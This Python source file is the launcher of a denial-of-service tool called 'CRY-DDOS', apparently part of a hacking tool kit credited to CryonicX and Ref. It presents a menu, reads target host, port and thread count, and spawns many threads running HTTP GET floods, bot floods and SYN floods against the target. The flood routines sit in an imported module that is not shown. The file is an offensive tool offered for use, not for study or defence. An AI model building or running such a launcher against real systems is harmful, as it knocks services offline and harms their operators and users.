import os , time , socket , random , threading , sys
from client.client import client
from client.text_color import color
from client.agents import user

def main():

    client().system("clear")
    client().system("figlet CRY-DDOS")

    client().puts(f"Welcome to CRY-DDOS\n\ngithub.com/CryonicsX\n")

    client().puts("""
1: Start the Script
2: MENU
    """)

    selection = client().read(f"Enter transaction number ")

    if selection == "1":
        def GenerateThreads(get , syn , bot , threadNumber , host , port):
            if get == True:
                for k in range(0, threadNumber):
                    try:
                        t = threading.Thread(target=client().GETAttack, args=[host,port,userAgents])
                        t.start()
                        print(f"{color.GREEN}[+] {str(k+1)}. GET Core Opened!{color.RESET_ALL}")
                    except Exception as e:
                        print(f"{color.RED}[-] {str(k+1)}. An Error Occurred While Opening GET Kernel!{color.RESET_ALL} {e}")

            if bot == True:
                for k in range(0, threadNumber):
                    try:
                        a = threading.Thread(target=client().BOTAttack, args=[host,userAgents])
                        a.start()
                        print (f"{color.GREEN}[+] {str(k+1)}. BOT Core Opened!{color.RESET_ALL}")
                    except Exception as e:
                        print (f"{color.RED}[-] {str(k+1)}. An Error Occurred While Booting The BOT Core!{color.RESET_ALL} {e}")


            if syn == True:
                for k in range(0, threadNumber):
                    try:
                        b = threading.Thread(target=client().SYNAttack, args=[host,port])
                        b.start()
                        print (f"{color.GREEN}[+] {str(k+1)}. SYN Core Opened!{color.RESET_ALL}")
                    except Exception as e:
                        print (f"{color.RED}[-] {str(k+1)}. An Error Occurred While Opening SYN Kernel!{color.RESET_ALL} {e}")



        userAgents = user().User_Agents()
        
        host, port, threadNumber, get, syn, bot = client().ParseArg()
        
        GenerateThreads(get, syn, bot, threadNumber, host, port)




    elif selection == "2":
        client().system("python3 main.py")

    else:
        client().puts("There is no such option")

    returnED = client().read(f"{color.GREEN} Do you want to make a new search?(Y/N) {color.RESET_ALL}").lower()

    if returnED == "y":
        client().system("python3 tools/ddos.py")


    elif returnED == "n":
        client().puts(f"""
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
        """)

    else:
        client().puts("There is no such option")

    
    
if __name__ == '__main__' and os.name == 'posix':
    if os.getuid() == 0:
        main()
    
else:
    client().puts(f"""
    
{color.GREEN}    
█░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀   ▀█▀ █▀█ █▀█ █░░   █▄▀ █ ▀█▀ █▀    Developed by CryonicX & Ref
█▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█   ░█░ █▄█ █▄█ █▄▄   █░█ █ ░█░ ▄█
{color.RESET_ALL}

{color.RED}[!] You can run this script only on debian system.{color.RESET_ALL}

        
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
    """)
